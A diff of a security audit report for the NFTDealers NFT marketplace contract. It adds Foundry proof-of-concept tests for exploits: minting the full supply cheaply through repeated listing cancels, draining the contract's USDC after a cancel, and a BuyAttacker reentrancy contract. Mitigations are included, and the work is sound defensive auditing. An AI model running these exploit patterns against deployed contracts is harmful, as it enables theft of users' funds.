@@ -45,25 +45,24 @@ Lead Security Researcher:
   - [Issues found](#issues-found)
 - [Findings](#findings)
   - [Critical](#critical)
-    - [\[C-1\] `NFTDealers::cancelListing()` returns minting collateral allowing attacker to mint entire MAX_SUPPLY with minimal capital](#c-1-nftdealerscancellisting-returns-minting-collateral-allowing-attacker-to-mint-entire-max_supply-with-minimal-capital)
-    - [\[C-2\] No sold/cancelled state differentiation allowing seller to drain contract USDC balance](#c-2-no-soldcancelled-state-differentiation-allowing-seller-to-drain-contract-usdc-balance)
+    - [\[C-1\] Cancel lisitng sending lock amount to whitelisted user (seller), allowing whitelisted user to mint entire MAX_SUPPLY with minimal capital](#c-1-cancel-lisitng-sending-lock-amount-to-whitelisted-user-seller-allowing-whitelisted-user-to-mint-entire-max_supply-with-minimal-capital)
+    - [\[C-2\] Seller can steal other users' USDC by calling collectUsdcFromSelling() after cancelling a listing](#c-2-seller-can-steal-other-users-usdc-by-calling-collectusdcfromselling-after-cancelling-a-listing)
   - [High](#high)
     - [\[H-1\] Inconsistent mapping key between `NFTDealers::list()` and `NFTDealers::buy()`, `NFTDealers::cancelListing()` and any other function that need to get nft data causes all listings to be permanently unreachable](#h-1-inconsistent-mapping-key-between-nftdealerslist-and-nftdealersbuy-nftdealerscancellisting-and-any-other-function-that-need-to-get-nft-data-causes-all-listings-to-be-permanently-unreachable)
     - [\[H-2\] `NFTDealers::updatePrice()` missing `MIN_PRICE` check allows seller to bypass minimum price enforcement](#h-2-nftdealersupdateprice-missing-min_price-check-allows-seller-to-bypass-minimum-price-enforcement)
   - [Medium](#medium)
-    - [\[M-1\] `NFTDealers::buy()` violates CEI pattern via `_safeTransfer()` enabling reentrancy](#m-1-nftdealersbuy-violates-cei-pattern-via-_safetransfer-enabling-reentrancy)
-    - [\[M-2\] `NFTDealers::mintNft()` and `NFTDealers::buy()` are marked `payable` with no ETH handling causing permanent ETH loss](#m-2-nftdealersmintnft-and-nftdealersbuy-are-marked-payable-with-no-eth-handling-causing-permanent-eth-loss)
-    - [\[M-3\] No burn mechanism causes minting collateral to be permanently locked if NFT is never sold](#m-3-no-burn-mechanism-causes-minting-collateral-to-be-permanently-locked-if-nft-is-never-sold)
+    - [\[M-1\] No burn mechanism causes minting collateral to be permanently locked if NFT is never sold](#m-1-no-burn-mechanism-causes-minting-collateral-to-be-permanently-locked-if-nft-is-never-sold)
   - [Low](#low)
     - [\[L-1\] `NFTDealers::list()` missing `onlyWhenRevealed` modifier allows listing before collection is revealed](#l-1-nftdealerslist-missing-onlywhenrevealed-modifier-allows-listing-before-collection-is-revealed)
     - [\[L-2\] `uint32` price type caps maximum listing price at ~4,294 USDC](#l-2-uint32-price-type-caps-maximum-listing-price-at-4294-usdc)
     - [\[L-3\] Constructor missing zero address validation for `_owner` and `_usdc` parameters](#l-3-constructor-missing-zero-address-validation-for-_owner-and-_usdc-parameters)
+    - [\[L-4\] `NFTDealers::mintNft()` and `NFTDealers::buy()` are marked `payable` with no ETH handling causing permanent ETH loss](#l-4-nftdealersmintnft-and-nftdealersbuy-are-marked-payable-with-no-eth-handling-causing-permanent-eth-loss)
   - [Informational](#informational)
     - [\[I-1\] `NFTDealers::calculateFees()` debug function left in production code exposes internal fee logic](#i-1-nftdealerscalculatefees-debug-function-left-in-production-code-exposes-internal-fee-logic)
     - [\[I-2\] `metadataFrozen` variable declared but never enforced allowing owner to change collection image at any time](#i-2-metadatafrozen-variable-declared-but-never-enforced-allowing-owner-to-change-collection-image-at-any-time)
     - [\[I-3\] Redundant `require(_price > 0)` in `NFTDealers::list()` wastes gas](#i-3-redundant-require_price--0-in-nftdealerslist-wastes-gas)
     - [\[I-4\] `NFT_Dealers_Sold` event missing `listingId` and `tokenId` making off-chain tracking unreliable](#i-4-nft_dealers_sold-event-missing-listingid-and-tokenid-making-off-chain-tracking-unreliable)
-    - [\[I-5\] `NFTDealers::mintNft()` violates CEI pattern via `_safeMint()` callback](#i-5-nftdealersmintnft-violates-cei-pattern-via-_safemint-callback)
+    - [\[I-5\] `NFTDealers::buy()` violates CEI pattern via `_safeTransfer()` enabling reentrancy](#i-5-nftdealersbuy-violates-cei-pattern-via-_safetransfer-enabling-reentrancy)
   - [Gas Optimization](#gas-optimization)
     - [\[G-1\] Use custom errors instead of `require` string messages to reduce gas costs](#g-1-use-custom-errors-instead-of-require-string-messages-to-reduce-gas-costs)
 
@@ -152,17 +151,18 @@ We spent 4 hour with 1 security researcher, we are using tools foundry as a fram
 
 | Severity | Number of issues found |
 | -------- | ---------------------- |
-| HIGH     | 2                      |
-| MEDIUM   | 0                      |
-| LOW      | 0                      |
-| INFO     | 1                      |
-| TOTAL    | 3                      |
+| HIGH     | 4                      |
+| MEDIUM   | 1                      |
+| LOW      | 4                      |
+| INFO     | 5                      |
+| GAS OPT  | 1                      |
+| TOTAL    | 15                     |
 
 # Findings
 
 ## Critical
 
-### [C-1] `NFTDealers::cancelListing()` returns minting collateral allowing attacker to mint entire MAX_SUPPLY with minimal capital
+### [C-1] Cancel lisitng sending lock amount to whitelisted user (seller), allowing whitelisted user to mint entire MAX_SUPPLY with minimal capital
 
 **Description:**
 
@@ -170,15 +170,23 @@ We spent 4 hour with 1 security researcher, we are using tools foundry as a fram
 
 ```solidity
 function cancelListing(uint256 _listingId) external {
-    // ...
+    Listing memory listing = s_listings[_listingId]; //! @> same as line 154
+    if (!listing.isActive) revert ListingNotActive(_listingId);
+    require(listing.seller == msg.sender, "Only seller can cancel listing");
+
+    s_listings[_listingId].isActive = false;
+    activeListingsCounter--;
+
     usdc.safeTransfer(listing.seller, collateralForMinting[listing.tokenId]); // @>
     collateralForMinting[listing.tokenId] = 0;
+
+    emit NFT_Dealers_ListingCanceled(_listingId);
 }
 ```
 
-**Impact:**
+**Risk:**
 
-An attacker with only `lockAmount` (20 USDC) can mint the entire `MAX_SUPPLY` of 1000 NFTs by repeating the pattern: `mintNft() > list() > cancelListing()`. This completely inflates the collection supply, devalues all existing NFTs, and breaks the economic model of the protocol.
+An whitelisted user with only `lockAmount` (20 USDC) can mint the entire `MAX_SUPPLY` of 1000 NFT by repeating the pattern: `mintNft() > list() > cancelListing()`. This completely allowing 1 whitelisted user to hold all the `MAX_SUPPLY` NFT
 
 **Proof of Concept:**
 
@@ -189,6 +197,38 @@ An attacker with only `lockAmount` (20 USDC) can mint the entire `MAX_SUPPLY` of
 5. Repeat steps 2-4 until tokenId #1000 (MAX_SUPPLY)
 6. Attacker now owns entire collection, spending only 20 USDC total
 
+<details>
+<summary>PoC</summary>
+
+```javascript
+
+function test_bloatingMaxSupplyJust20USDC() public whitelisted richWhitelisted revealed {
+    // userWithCash exploit to mint all MAX_SUPPLY on her own
+    for (uint256 i; i < nftDealers.MAX_SUPPLY(); ++i) {
+        vm.startPrank(userWithCash);
+        usdc.approve(address(nftDealers), type(uint256).max);
+        nftDealers.mintNft();
+
+        uint256 tokenId = i + 1; // internal calculation nftDealers tokenId
+
+        nftDealers.list(tokenId, uint32(nftDealers.MIN_PRICE()));
+        nftDealers.cancelListing(tokenId);
+        vm.stopPrank();
+
+        assertEq(nftDealers.ownerOf(tokenId), userWithCash);
+    }
+
+    // now userWithEvenMoreCash turn to try mint NFT
+    vm.startPrank(userWithEvenMoreCash);
+    usdc.approve(address(nftDealers), type(uint256).max);
+    vm.expectRevert();
+    nftDealers.mintNft();
+}
+
+```
+
+</details>
+
 **Recommended Mitigation:**
 
 Collateral should be locked for the lifetime of the NFT, not the listing. Remove collateral return from `cancelListing()` and instead implement a `burnNft()` function that returns collateral only when the NFT is destroyed:
@@ -198,49 +238,128 @@ function cancelListing(uint256 _listingId) external {
     // ...
     s_listings[_listingId].isActive = false;
     activeListingsCounter--;
--  usdc.safeTransfer(listing.seller, collateralForMinting[listing.tokenId]);
--  collateralForMinting[listing.tokenId] = 0;
--
+-   usdc.safeTransfer(listing.seller, collateralForMinting[listing.tokenId]);
+-   collateralForMinting[listing.tokenId] = 0;
+
     emit NFT_Dealers_ListingCanceled(_listingId);
 }
 
-+function burnNft(uint256 _tokenId) external {
-+  require(ownerOf(_tokenId) == msg.sender, "Not owner of NFT");
-+  uint256 collateral = collateralForMinting[_tokenId];
-+  collateralForMinting[_tokenId] = 0;
-+  _burn(_tokenId);
-+  usdc.safeTransfer(msg.sender, collateral);
-+}
++ function burnNft(uint256 _tokenId) external {
++   require(ownerOf(_tokenId) == msg.sender, "Not owner of NFT");
++   uint256 collateral = collateralForMinting[_tokenId];
++   collateralForMinting[_tokenId] = 0;
++   _burn(_tokenId);
++   usdc.safeTransfer(msg.sender, collateral);
++ }
 ```
 
-### [C-2] No sold/cancelled state differentiation allowing seller to drain contract USDC balance
+### [C-2] Seller can steal other users' USDC by calling collectUsdcFromSelling() after cancelling a listing
 
 **Description:**
 
-`NFTDealers::collectUsdcFromSelling()` only checks `!listing.isActive` to determine if a seller can collect proceeds. However, `isActive` is set to `false` in two different scenarios: when an NFT is sold via `NFTDealers::buy()`, and when a listing is cancelled via `NFTDealers::cancelListing()`. This means a seller can call `NFTDealers::collectUsdcFromSelling()` after cancelling a listing, even though no buyer ever paid. Additionally, `NFTDealers::collateralForMinting[listing.tokenId]` is never reset to `0` after collection, allowing the function to be called multiple times to drain the contract.
+`NFTDealers::collectUsdcFromSelling()` only check `!listing.isActive` for validate eligibility seller for colelcting their money. Because `NFTDealers::cancelListing()` also set `isActive` = `false`, seller can call `collectUsdcFromSelling()` after cancel listing even there is no buyer. Because of this seller can steal `listing.price`, USDC from other people that behalf on contract.
 
-```solidity
+**Root cause:**
+
+`NFTDealers::buy()` and `NFTDealers::cancelListing()` both only set `isActive` = `false` without different state, therefor `collectUsdcFromSelling()` cant spot a different wether listing is truly sold, or just canceled listing.
+
+```javascript
+// buy()
+function buy(uint256 _listingId) external payable {
+  bool success = usdc.transferFrom(msg.sender, address(this), listing.price);
+  // ...
+  s_listings[_listingId].isActive = false; // @>
+}
+
+// cancelListing()
+function cancelListing(uint256 _listingId) external {
+  // ...
+  s_listings[_listingId].isActive = false; // @> exact same
+  collateralForMinting[listing.tokenId] = 0;
+  usdc.safeTransfer(listing.seller, collateralForMinting[listing.tokenId]);
+}
+
+// collectUsdcFromSelling() true in that two different scenarios
 function collectUsdcFromSelling(uint256 _listingId) external onlySeller(_listingId) {
-    require(!listing.isActive, "Listing must be inactive to collect USDC"); // @> no sold vs cancelled check
+  require(!listing.isActive, "Listing must be inactive to collect USDC"); // @> no sold vs cancelled check
 
-    uint256 collateralToReturn = collateralForMinting[listing.tokenId]; // @> never reset to 0
-    amountToSeller += collateralToReturn;
-    usdc.safeTransfer(msg.sender, amountToSeller); // @> can be called repeatedly
+  uint256 fees = _calculateFees(listing.price);
+  uint256 amountToSeller = listing.price - fees; // @> listing.price never transfered to contract
+  uint256 collateralToReturn = collateralForMinting[listing.tokenId];
+  amountToSeller += collateralToReturn;
+
+  usdc.safeTransfer(address(this), fees);    // @> another weird calculation
+  usdc.safeTransfer(msg.sender, amountToSeller); // @> drain others USDC
 }
 ```
 
 **Impact:**
 
-A malicious seller can drain the entire USDC balance of the contract by: cancelling a listing then calling `NFTDealers::collectUsdcFromSelling()` repeatedly. Each call transfers `listing.price +collateralForMinting` from the contract to the attacker without any USDC ever being deposited by a buyer.
+- Seller can steal `listing.price - fees` from contract without any settlement from buyer
+- USDC that stealed is on behalf of other legitimate seller/buyer (from legitimate `buy()`)
+- More higher `listing.price` that attacker set, more high can be stolen USDC per call
+- USDC contract can be drained
 
 **Proof of Concept:**
 
 1. Attacker mints NFT, paying 20 USDC collateral
 2. Calls `list(tokenId, 1000e6)`
-3. Calls `cancelListing()` > `isActive` set to `false`
-4. Calls `collectUsdcFromSelling()` > receives `1000e6 +20e6` from contract balance
-5. Calls `collectUsdcFromSelling()` again > `collateralForMinting` still not reset, drains another `20e6`
+3. Calls `cancelListing()` -> `isActive` set to `false`
+4. Calls `collectUsdcFromSelling()` -> receives `1000e6 +20e6` from contract balance
+5. Calls `collectUsdcFromSelling()` again -> `collateralForMinting` still not reset, drains another `20e6`
 6. Repeat step 5 until contract is empty
+
+<details>
+<summary>PoC</summary>
+
+```javascript
+
+function test_drainingUSDCContractWith_collectUsdcFromSelling() public whitelisted richWhitelisted revealed {
+    vm.startPrank(userWithCash);
+    usdc.approve(address(nftDealers), type(uint256).max);
+    nftDealers.mintNft();
+    uint256 tokenId = 1; // since this is the first NFT mint ever so we can easily know the id
+    nftDealers.list(tokenId, 100e6);
+    nftDealers.cancelListing(tokenId);
+
+    (address seller, uint32 price,, uint256 _tokenId, bool isActive) = nftDealers.s_listings(tokenId);
+
+    assertEq(seller, userWithCash);
+    assertEq(price, 100e6);
+    assertEq(_tokenId, tokenId);
+    assertEq(isActive, false);
+
+    // =============
+    // Attack Begin
+    // =============
+
+    // Supply nftDealers with dozens of usdc
+
+    usdc.mint(address(nftDealers), 20e6 * 100);
+
+    uint256 initialContractUSDC = usdc.balanceOf(address(nftDealers));
+    uint256 initialUserUSDC = usdc.balanceOf(userWithCash);
+
+    console.log("Initial Contract USDC balance: ", initialContractUSDC / 1e6); // Just use USDC with no floating poitn for easier display to read
+    console.log("Initial User USDC balance: ", initialUserUSDC / 1e6);
+
+    for (uint256 i; i < 20; i++) {
+        console.log("Attempt: ", i);
+        nftDealers.collectUsdcFromSelling(tokenId);
+    }
+
+    uint256 afterContractUSDC = usdc.balanceOf(address(nftDealers));
+    uint256 afterUserUSDC = usdc.balanceOf(userWithCash);
+
+    console.log("after Contract USDC balance: ", afterContractUSDC / 1e6);
+    console.log("after User USDC balance: ", afterUserUSDC / 1e6);
+
+    assertGt(afterUserUSDC, 20e6); // User can get greater that 20e6 that he only just own in the first place
+}
+
+```
+
+</details>
 
 **Recommended Mitigation:**
 
@@ -253,21 +372,21 @@ struct Listing {
     address seller;
     uint32 price;
     uint256 tokenId;
-+    ListingStatus status; // replace bool isActive
+-   bool isActive;
++   ListingStatus status; // replace bool isActive
 }
 
-function collectUsdcFromSelling(uint256 _listingId) external onlySeller(_listingId) {
-    Listing memory listing = s_listings[_listingId];
-+    require(listing.status == ListingStatus.Sold, "Listing must be sold to collect USDC");
+// buy()
+- s_listings[_listingId].isActive = false;
++ s_listings[_listingId].status = ListingStatus.Sold;
 
-    uint256 collateralToReturn = collateralForMinting[listing.tokenId];
-+   collateralForMinting[listing.tokenId] = 0;
+// cancelListing()
+- s_listings[_listingId].isActive = false;
++ s_listings[_listingId].status = ListingStatus.Cancelled;
 
-    uint256 fees = _calculateFees(listing.price);
-    uint256 amountToSeller = listing.price -fees +collateralToReturn;
-    totalFeesCollected += fees;
-    usdc.safeTransfer(msg.sender, amountToSeller);
-}
+// collectUsdcFromSelling()
+- require(!listing.isActive, "Listing must be inactive to collect USDC");
++ require(listing.status == ListingStatus.Sold, "NFT must be sold to collect USDC");
 ```
 
 ## High
@@ -298,11 +417,62 @@ Any buyer relying on the emitted `listingId` to call `NFTDealers::buy()` will al
 
 **Proof of Concept:**
 
-1. Seller calls `list(tokenId=5, price=100e6)` - stored at `s_listings[5]`, event emits `listingId=1`
-2. Buyer sees event with `listingId=1`, calls `buy(1)`
-3. `s_listings[1]` is empty - `isActive = false`
-4. Transaction always reverts with `ListingNotActive(1)`
-5. Listing at `s_listings[5]` permanently inaccessible
+1. User 1 mint 2 nft, but only list 1
+2. User 2 mint 1 nft and list em
+3. Form user 2 list call successfull, event emited that listingId is 2
+4. Buyer want to buy NFT that listed by user 2
+5. Because inconsistency of mapping on storing in list and get, log from other func, become s_lisitngs[2] is on default state
+
+<details>
+<summary>PoC</summary>
+
+```javascript
+
+function test_inconsistentMappingKey() public whitelisted richWhitelisted revealed {
+    // Approve
+    vm.prank(userWithCash);
+    usdc.approve(address(nftDealers), type(uint256).max);
+
+    vm.prank(userWithEvenMoreCash);
+    usdc.approve(address(nftDealers), type(uint256).max);
+
+    // userWithEvenMoreCash mint 2 nft, list only 1
+    vm.startPrank(userWithEvenMoreCash);
+    nftDealers.mintNft(); // tokenId -> 1
+    nftDealers.mintNft(); // tokenId -> 2
+    nftDealers.list(1, 100e6); // -> s_listings 1
+    // emited NFT_Dealers_Listed(msg.sender, listingsCounter -> 1);
+    vm.stopPrank();
+
+    // userWithCash mint and list
+    vm.startPrank(userWithCash);
+    nftDealers.mintNft(); // tokenId -> 3
+    nftDealers.list(3, 100e6); // -> s_listings 3
+    // emited NFT_Dealers_Listed(msg.sender, listingsCounter -> 2);
+    vm.stopPrank();
+
+    // user that want to buy NFT that listed by userWithCash wich logged as 2 (listingCounter), expect to get buy(uint256 _listingId) or any other that have _lisitngId params, with 2
+
+    /**
+     * but the reality when
+     * Listing memory listing = s_listings[_listingId];
+     * the s_lisitng[2] is nothing, becauce here is the state that we currently on
+     * nftDealers.list(1, 100e6); // -> s_listings 1
+     * nftDealers.list(3, 100e6); // -> s_listings 3
+     */
+
+    address buyer = makeAddr("buyer");
+
+    usdc.mint(buyer, 100e6);
+
+    vm.prank(buyer);
+    vm.expectRevert();
+    nftDealers.buy(2);
+}
+
+```
+
+</details>
 
 **Recommended Mitigation:**
 
@@ -322,7 +492,7 @@ function list(uint256 _tokenId, uint32 _price) external onlyWhitelisted {
         isActive: true
     });
 
-    emit NFT_Dealers_Listed(msg.sender, listingsCounter);
++   emit NFT_Dealers_Listed(msg.sender, listingsCounter);
 }
 ```
 
@@ -365,123 +535,7 @@ function updatePrice(uint256 _listingId, uint32 _newPrice) external onlySeller(_
 
 ## Medium
 
-### [M-1] `NFTDealers::buy()` violates CEI pattern via `_safeTransfer()` enabling reentrancy
-
-**Description:**
-
-`NFTDealers::buy()` sets `s_listings[_listingId].isActive = false` after calling `_safeTransfer()`, which triggers the `onERC721Received()` callback on receiver contracts. Since `isActive` is still `true` during the callback, a malicious buyer contract can re-enter `NFTDealers::buy()` for the same listing before the state is updated.
-
-```solidity
-function buy(uint256 _listingId) external payable {
-    // ...
-    usdc.transferFrom(msg.sender, address(this), listing.price);
-    _safeTransfer(listing.seller, msg.sender, listing.tokenId, ""); // @> callback here
-
-    s_listings[_listingId].isActive = false; // @> state updated too late
-}
-```
-
-**Impact:**
-
-A malicious buyer contract can re-enter `NFTDealers::buy()` during `onERC721Received()` callback. However, since the NFT has already transferred to the attacker on the first call, the second `_safeTransfer()` will revert as the seller is no longer the owner. The attacker ends up paying double for the same NFT - so the practical impact is self-harm rather than protocol drain. Severity is reduced to Low due to no financial gain and self-destructive nature of the exploit.
-
-**Proof of Concept**
-
-```solidity
-contract BuyAttacker {
-    NFTDealers target;
-    IERC20 usdc;
-    uint256 targetListingId;
-    bool attacked;
-
-    constructor(address _target, address _usdc) {
-        target = NFTDealers(_target);
-        usdc = IERC20(_usdc);
-    }
-
-    function attack(uint256 _listingId) external {
-        targetListingId = _listingId;
-        // approve enough USDC for 2x price (double payment scenario)
-        usdc.approve(address(target), type(uint256).max);
-        target.buy(_listingId);
-    }
-
-    function onERC721Received(
-        address operator,
-        address from,
-        uint256 tokenId,
-        bytes calldata data
-    ) external returns (bytes4) {
-        // isActive is still true here - re-enter buy()
-        if (!attacked) {
-            attacked = true;
-            target.buy(targetListingId); // re-enter with same listingId
-            // this will revert on _safeTransfer
-            // because seller no longer owns the NFT
-            // attacker has paid listing.price twice
-        }
-        return this.onERC721Received.selector;
-    }
-}
-```
-
-Attack flow:
-
-1.  Deploy `BuyAttacker`, fund with `2x listing.price` USDC
-2.  Call `BuyAttacker::attack(listingId)`
-3.  First `buy()` - USDC transferred, NFT transferred to `BuyAttacker`, callback triggered
-4.  Inside `onERC721Received` - `isActive` still `true`, re-enter `buy()`
-5.  Second \`buy()\` - USDC transferred again, \`\_safeTransfer\` reverts (seller no longer owner)&#x20;
-6.  Entire second re-entry reverts, but \*\*first call already succeeded\*\*&#x20;
-7.  Net result: attacker paid \`listing.price\` once, owns NFT - \*\*no gain, no protocol loss\*\*
-
-**Recommended Mitigation:**
-
-Follow CEI pattern - update `isActive` before any external calls:
-
-```diff
-function buy(uint256 _listingId) external {
-    Listing memory listing = s_listings[_listingId];
-    if (!listing.isActive) revert ListingNotActive(_listingId);
-    require(listing.seller != msg.sender, "Seller cannot buy their own NFT");
-
-    // Effects first
-+  s_listings[_listingId].isActive = false;
-+  activeListingsCounter--;
-
-    // Interactions last
-+  usdc.transferFrom(msg.sender, address(this), listing.price);
-+  _safeTransfer(listing.seller, msg.sender, listing.tokenId, "");
-
-    emit NFT_Dealers_Sold(msg.sender, listing.price);
-}
-```
-
-### [M-2] `NFTDealers::mintNft()` and `NFTDealers::buy()` are marked `payable` with no ETH handling causing permanent ETH loss
-
-**Description:**
-
-Both `NFTDealers::mintNft()` and `NFTDealers::buy()` are marked as `payable` despite the protocol exclusively using USDC for all payments. There is no ETH withdrawal function, no `msg.value` validation, and no ETH refund mechanism anywhere in the contract. Any ETH sent to these functions will be permanently locked.
-
-```solidity
-function mintNft() external payable onlyWhenRevealed onlyWhitelisted { /* @> payable */ }
-function buy(uint256 _listingId) external payable { /* @> payable */ }
-```
-
-**Impact:**
-
-Users who accidentally send ETH alongside their transaction will permanently lose those funds with no recovery path. The contract has no `withdraw` function for ETH and no way for the owner to recover stuck ETH.
-
-**Recommended Mitigation:**
-
-Remove `payable` modifier from both functions since ETH payments are not intended:
-
-```diff
-+function mintNft() external onlyWhenRevealed onlyWhitelisted { }
-+function buy(uint256 _listingId) external { }
-```
-
-### [M-3] No burn mechanism causes minting collateral to be permanently locked if NFT is never sold
+### [M-1] No burn mechanism causes minting collateral to be permanently locked if NFT is never sold
 
 **Description:**
 
@@ -587,6 +641,30 @@ constructor(address _owner, address _usdc, ...) {
 }
 ```
 
+### [L-4] `NFTDealers::mintNft()` and `NFTDealers::buy()` are marked `payable` with no ETH handling causing permanent ETH loss
+
+**Description:**
+
+`NFTDealers::mintNft()` and `NFTDealers::buy()` are marked `payable` despite the protocol exclusively using USDC for all payment flows. The `payable` keyword explicitly allows ETH to be sent alongside these calls, unlike non-payable functions which automatically revert on ETH receipt at the compiler level. However, the contract contains no `receive()` `fallback()`, no `withdraw()` function, and no `msg.value` validation, meaning any ETH sent to these functions becomes permanently locked with no recovery path.
+
+```solidity
+function mintNft() external payable onlyWhenRevealed onlyWhitelisted { /* @> payable */ }
+function buy(uint256 _listingId) external payable { /* @> payable */ }
+```
+
+**Impact:**
+
+Users who accidentally send ETH alongside their transaction will permanently lose those funds with no recovery path. The contract has no `withdraw` function for ETH and no way for the owner to recover stuck ETH.
+
+**Recommended Mitigation:**
+
+Remove `payable` modifier from both functions since ETH payments are not intended:
+
+```diff
++function mintNft() external onlyWhenRevealed onlyWhitelisted { }
++function buy(uint256 _listingId) external { }
+```
+
 ## Informational
 
 ### [I-1] `NFTDealers::calculateFees()` debug function left in production code exposes internal fee logic
@@ -676,44 +754,95 @@ event NFT_Dealers_ListingCanceled(uint256 listingId);
 +event NFT_Dealers_Sold(address indexed soldTo, uint256 indexed listingId, uint256 indexed tokenId, uint256 price);
 ```
 
-### [I-5] `NFTDealers::mintNft()` violates CEI pattern via `_safeMint()` callback
+### [I-5] `NFTDealers::buy()` violates CEI pattern via `_safeTransfer()` enabling reentrancy
 
 **Description:**
 
-`NFTDealers::mintNft()` violates the Checks-Effects-Interactions (CEI) pattern. `usdc.transferFrom()` is called before state updates (`tokenIdCounter`, `collateralForMinting`).
+`buy()` violates CEI pattern, `isActive` set after `_safeTransfer()` creating a state inconsistency window, where a malicious ERC721 receiver contract can observe stale state during `onERC721Received()` callback
 
 ```solidity
-function mintNft() external payable onlyWhenRevealed onlyWhitelisted {
-    require(tokenIdCounter < MAX_SUPPLY, "Max supply reached");
+function buy(uint256 _listingId) external payable {
+    // ...
+    usdc.transferFrom(msg.sender, address(this), listing.price);
+    _safeTransfer(listing.seller, msg.sender, listing.tokenId, ""); // @> callback here
 
-    usdc.transferFrom(msg.sender, address(this), lockAmount); // @> Interaction before Effects
-
-    tokenIdCounter++;                                    // Effect 1
-    collateralForMinting[tokenIdCounter] = lockAmount;   // Effect 2
-    _safeMint(msg.sender, tokenIdCounter);               // Interaction - triggers onERC721Received
+    s_listings[_listingId].isActive = false; // @> state updated too late
 }
 ```
 
 **Impact:**
 
-In the current implementation, direct exploitation is not possible - state is correctly updated before `_safeMint()` callback, and `MAX_SUPPLY` remains enforced across re-entries since `tokenIdCounter` increments properly. However, the pattern violation itself is dangerous as any future changes to the function logic could inadvertently introduce a real reentrancy vulnerability.
+A malicious buyer contract can re-enter `NFTDealers::buy()` during `onERC721Received()` callback. However, since the NFT has already transferred to the attacker on the first call, the second `_safeTransfer()` will revert as the seller is no longer the owner. The attacker ends up paying double for the same NFT - so the practical impact is self-harm rather than protocol drain. Severity is reduced to Low due to no financial gain and self-destructive nature of the exploit.
+
+**Proof of Concept**
+
+```solidity
+contract BuyAttacker {
+    NFTDealers target;
+    IERC20 usdc;
+    uint256 targetListingId;
+    bool attacked;
+
+    constructor(address _target, address _usdc) {
+        target = NFTDealers(_target);
+        usdc = IERC20(_usdc);
+    }
+
+    function attack(uint256 _listingId) external {
+        targetListingId = _listingId;
+        // approve enough USDC for 2x price (double payment scenario)
+        usdc.approve(address(target), type(uint256).max);
+        target.buy(_listingId);
+    }
+
+    function onERC721Received(
+        address operator,
+        address from,
+        uint256 tokenId,
+        bytes calldata data
+    ) external returns (bytes4) {
+        // isActive is still true here - re-enter buy()
+        if (!attacked) {
+            attacked = true;
+            target.buy(targetListingId); // re-enter with same listingId
+            // this will revert on _safeTransfer
+            // because seller no longer owns the NFT
+            // attacker has paid listing.price twice
+        }
+        return this.onERC721Received.selector;
+    }
+}
+```
+
+Attack flow:
+
+1.  Deploy `BuyAttacker`, fund with `2x listing.price` USDC
+2.  Call `BuyAttacker::attack(listingId)`
+3.  First `buy()` - USDC transferred, NFT transferred to `BuyAttacker`, callback triggered
+4.  Inside `onERC721Received` - `isActive` still `true`, re-enter `buy()`
+5.  Second \`buy()\` - USDC transferred again, \`\_safeTransfer\` reverts (seller no longer owner)&#x20;
+6.  Entire second re-entry reverts, but \*\*first call already succeeded\*\*&#x20;
+7.  Net result: attacker paid \`listing.price\` once, owns NFT - \*\*no gain, no protocol loss\*\*
 
 **Recommended Mitigation:**
 
-Follow CEI pattern strictly by moving all state updates before any external calls:
+Follow CEI pattern - update `isActive` before any external calls:
 
 ```diff
-function mintNft() external onlyWhenRevealed onlyWhitelisted {
-    require(tokenIdCounter < MAX_SUPPLY, "Max supply reached");
-    require(msg.sender != owner, "Owner can't mint NFTs");
+function buy(uint256 _listingId) external {
+    Listing memory listing = s_listings[_listingId];
+    if (!listing.isActive) revert ListingNotActive(_listingId);
+    require(listing.seller != msg.sender, "Seller cannot buy their own NFT");
 
-+   // Effects first
-+   tokenIdCounter++;
-+   collateralForMinting[tokenIdCounter] = lockAmount;
+    // Effects first
++  s_listings[_listingId].isActive = false;
++  activeListingsCounter--;
 
-+   // Interactions last
-+   usdc.transferFrom(msg.sender, address(this), lockAmount);
-+   _safeMint(msg.sender, tokenIdCounter);
+    // Interactions last
++  usdc.transferFrom(msg.sender, address(this), listing.price);
++  _safeTransfer(listing.seller, msg.sender, listing.tokenId, "");
+
+    emit NFT_Dealers_Sold(msg.sender, listing.price);
 }
 ```
 
